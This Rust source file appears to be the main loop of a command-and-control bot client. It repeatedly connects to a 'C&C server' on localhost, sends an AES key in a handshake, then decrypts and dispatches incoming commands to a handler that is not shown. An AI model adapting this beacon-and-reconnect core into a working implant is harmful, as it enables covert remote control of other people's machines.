use tokio::signal;
use tokio::io::AsyncWriteExt;
use std::time::Duration;
use std::thread;

mod socket;
mod crypto;

const IP: &'static str = "127.0.0.1";
const PORT: u16 = 8080;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // This is a reconnection loop if something goes wrong.
    let (k, n) = crypto::generate_aes();

    let handshake = format!("{} {}", base64::encode(&k.0), base64::encode(&n.0));
    loop {
        thread::sleep(Duration::from_millis(1000));
        // connect to the socket
        let connection = socket::connect_to_cnc(IP, PORT).await;

        if let Err(_) = connection {continue} // Break if connection refused.

        println!("Connected to C&C server successfully");

        let mut stream = socket::SocketStream::new(connection.unwrap());

        // send handshake
        println!("Sending handshake");
        stream.stream.write_all(&handshake.as_bytes()).await?;

        // Message reading loop
        loop {
            let msg = stream.consume_message().await;

            if let Err(ref e) = msg {
                if e.kind() == std::io::ErrorKind::WouldBlock {
                    continue
                }
                // break
            } // this error probably indicates about block of the read abilities.

            let (msg, n_bytes) = msg.unwrap();
            
            if n_bytes == 0 {
                break // try to reconnect
            }

            let trimmed = msg.split(|s| s == &(0 as u8)).next().unwrap();

            let decrypted_msg = crypto::decrypt_from_aes(trimmed.to_vec(), &k, &n);
            stream.handle_msg(decrypted_msg).await;
        }

        eprintln!("Disconnected, trying to reconnect in 5 seconds...");
    }
}
